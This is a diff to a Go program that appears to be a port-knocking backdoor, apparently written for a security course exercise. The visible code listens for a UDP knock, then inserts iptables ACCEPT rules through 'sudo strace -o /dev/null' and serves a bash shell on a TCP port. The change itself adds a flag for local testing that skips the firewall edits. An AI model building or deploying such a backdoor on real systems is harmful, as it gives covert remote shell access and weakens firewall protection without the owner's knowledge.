@@ -7,6 +7,7 @@ import (
 	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
+	"flag"
 	"fmt"
 	"io"
 	"net"
@@ -198,32 +199,40 @@ func handleConnection(conn net.Conn) {
 	bash.Wait()
 }
 
-func openUDPRules() {
-	openInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
-	openOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "OUTPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
-	openInPort.Run()
-	openOutPort.Run()
+func openUDPRules(local bool) {
+	if !local {
+		openInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+		openOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "OUTPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+		openInPort.Run()
+		openOutPort.Run()
+	}
 }
 
-func openTCPRules() {
-	openInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
-	openOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "OUTPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
-	openInPort.Run()
-	openOutPort.Run()
+func openTCPRules(local bool) {
+	if !local {
+		openInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+		openOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "OUTPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+		openInPort.Run()
+		openOutPort.Run()
+	}
 }
 
-func deleteUDPRules() {
-	closeInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "INPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
-	closeOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "OUTPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
-	closeInPort.Run()
-	closeOutPort.Run()
+func deleteUDPRules(local bool) {
+	if !local {
+		closeInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "INPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+		closeOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "OUTPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+		closeInPort.Run()
+		closeOutPort.Run()
+	}
 }
 
-func deleteTCPRules() {
-	closeInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "INPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
-	closeOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "OUTPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
-	closeInPort.Run()
-	closeOutPort.Run()
+func deleteTCPRules(local bool) {
+	if !local {
+		closeInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "INPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+		closeOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "OUTPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+		closeInPort.Run()
+		closeOutPort.Run()
+	}
 }
 
 // Function provided by which works pretty well for the week4 machine
@@ -246,7 +255,14 @@ func GetLocalIP() string {
 }
 
 func main() {
-	CONN_HOST := GetLocalIP()
+	var local = flag.Bool("l", false, "for setting local testing")
+	flag.Parse()
+	var CONN_HOST string
+	if *local {
+		CONN_HOST = "localhost"
+	} else {
+		CONN_HOST = GetLocalIP()
+	}
 
 	// Makes sure we close iptables ports before forcefully quitting
 	c := make(chan os.Signal)
@@ -254,8 +270,8 @@ func main() {
 	go func() {
 		<-c
 		fmt.Println("CLEANING UP IPTABLES")
-		deleteUDPRules()
-		deleteTCPRules()
+		deleteUDPRules(*local)
+		deleteTCPRules(*local)
 		os.Exit(1)
 	}()
 
@@ -266,10 +282,10 @@ func main() {
 	connReady := make(chan bool)
 	go func() {
 		for {
-			deleteTCPRules()
+			deleteTCPRules(*local)
 			connReady <- true
 			<-connAttempt
-			openTCPRules()
+			openTCPRules(*local)
 			sock, err := net.ListenTCP(CONN_TYPE, tcpAddr)
 			if err != nil {
 				fmt.Println("Error listening:", err.Error())
@@ -298,7 +314,7 @@ func main() {
 	}
 	for {
 		<-connReady
-		openUDPRules()
+		openUDPRules(*local)
 		for {
 			r, _ := conn.Read(buf)
 			msg := string(buf[:r])
@@ -307,7 +323,7 @@ func main() {
 				break
 			}
 		}
-		deleteUDPRules()
+		deleteUDPRules(*local)
 		connAttempt <- true
 	}
 }
